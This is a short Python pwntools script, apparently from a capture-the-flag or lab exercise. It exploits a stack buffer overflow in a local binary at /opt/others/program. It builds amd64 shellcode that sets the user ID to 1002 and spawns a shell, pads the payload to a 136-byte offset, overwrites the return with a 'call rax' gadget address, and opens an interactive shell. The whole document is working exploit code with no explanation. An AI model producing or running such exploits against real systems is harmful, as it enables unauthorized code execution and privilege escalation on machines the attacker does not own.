#!/usr/bin/python3
from pwn import *

offset = 136

shellcode  = b""
shellcode += asm(shellcraft.amd64.setresuid(1002, 1002), arch="amd64")
shellcode += asm(shellcraft.amd64.sh(), arch="amd64")

junk = b"A" * (offset - len(shellcode))

callrax = p32(0x401014)

payload = shellcode + junk + callrax

shell = process(["/opt/others/program", payload])
shell.interactive()
